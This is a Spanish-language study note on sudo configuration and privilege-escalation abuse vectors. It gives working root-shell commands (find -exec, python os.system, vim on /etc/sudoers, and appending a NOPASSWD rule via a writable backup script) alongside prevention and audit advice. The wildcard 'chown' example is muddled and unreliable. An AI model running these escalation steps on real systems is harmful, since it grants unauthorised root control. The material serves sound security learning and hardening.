
## ¿Qué es Sudo?

Sudo (SuperUser DO) es un programa diseñado para sistemas Unix/Linux que permite a los usuarios ejecutar programas con los privilegios de seguridad de otro usuario, normalmente el superusuario (root).

## Configuración de Sudo

Los privilegios de sudo se configuran en el archivo `/etc/sudoers` o en archivos dentro del directorio `/etc/sudoers.d/`. Esta configuración determina quién puede usar sudo y qué comandos pueden ejecutar.

### Sintaxis Básica del Archivo Sudoers

```bash
usuario ALL=(ALL) NOPASSWD: comando
```

Donde:
- `usuario`: El nombre del usuario que tiene permisos.
- `ALL`: El host en el que se aplica la regla (normalmente `ALL`).
- `(ALL)`: El usuario al que se cambiará (normalmente `ALL` para root).
- `NOPASSWD:`: Indica que no se requiere contraseña para ejecutar el comando.
- `comando`: El comando específico que el usuario puede ejecutar.

```bash
usuario ALL=(root) NOPASSWD: /usr/bin/apt-get
```

## Posibles Vectores de Abuso

> Se usa mucho [[GTFOBins]]
### 1. Ejecución de Comandos Específicos

**Ejemplo:** Supongamos que un usuario tiene permiso para ejecutar un comando específico como root:

```
usuario ALL=(ALL) NOPASSWD: /usr/bin/find
```

**Abuso:**
```bash
# El usuario puede usar 'find' para ejecutar comandos arbitrarios
sudo find / -exec /bin/bash \;
```

Este comando inicia una shell con privilegios de root.

### 2. Permisos de Edición de Archivos Sensibles

**Ejemplo:** El usuario puede editar cualquier archivo:

```
usuario ALL=(ALL) NOPASSWD: /usr/bin/vim
```

**Abuso:**
```bash
# Editar el archivo sudoers para otorgarse más privilegios
sudo vim /etc/sudoers

# O añadir un usuario al archivo passwd
sudo vim /etc/passwd
```

### 3. Wildcards en la Configuración

**Ejemplo:** Configuración con wildcards:

```
usuario ALL=(ALL) NOPASSWD: /bin/chown * /home/usuario/archivo
```

**Abuso:**
```bash
# Usar el wildcard para ejecutar comandos adicionales
sudo chown root --reference=/etc/passwd /home/usuario/archivo
```

### 4. Comandos que Pueden Lanzar Shells

**Ejemplo:** Usuario con permiso para usar programas que pueden lanzar shells:

```
usuario ALL=(ALL) NOPASSWD: /usr/bin/python
```

**Abuso:**
```bash
# Lanzar una shell con privilegios de root mediante Python
sudo python -c 'import os; os.system("/bin/bash")'
```

### 5. Permisos de Sudo sin Contraseña

**Ejemplo:** Configuración NOPASSWD para todos los comandos:

```
usuario ALL=(ALL) NOPASSWD: ALL
```

**Abuso:**
```bash
# El usuario puede ejecutar cualquier comando como root sin contraseña
sudo su -
```

## Cómo Detectar y Prevenir estos Abusos

1. **Revisión Regular**: Auditar regularmente el archivo sudoers.
2. **Principio de Privilegio Mínimo**: Otorgar solo los privilegios necesarios.
3. **Evitar Wildcards**: No usar comodines en la configuración de sudo.
4. **Monitoreo**: Implementar sistemas de monitoreo para detectar abusos.
5. **Usar sudoreplay**: Para auditar las sesiones de sudo.

## Comandos Útiles para Verificar Configuración

```bash
# Ver tus permisos sudo
sudo -l

# Verificar la sintaxis del archivo sudoers
visudo -c

# Ver quién tiene privilegios sudo en el sistema
grep -r "ALL=(ALL)" /etc/sudoers /etc/sudoers.d/
```

## Ejemplo Práctico de Escalada de Privilegios

Supongamos que tienes permisos para ejecutar un script como root:

```
usuario ALL=(ALL) NOPASSWD: /scripts/backup.sh
```

Si puedes editar este script, podrías:

```bash
# Añadir al final del script
echo 'echo "usuario ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' >> /scripts/backup.sh

# Ejecutar el script con sudo
sudo /scripts/backup.sh

# Ahora tienes acceso completo a sudo
sudo su
```

Recuerda: La seguridad del sistema depende de una configuración adecuada de sudo.

---

[[Escalada de Privilegios]]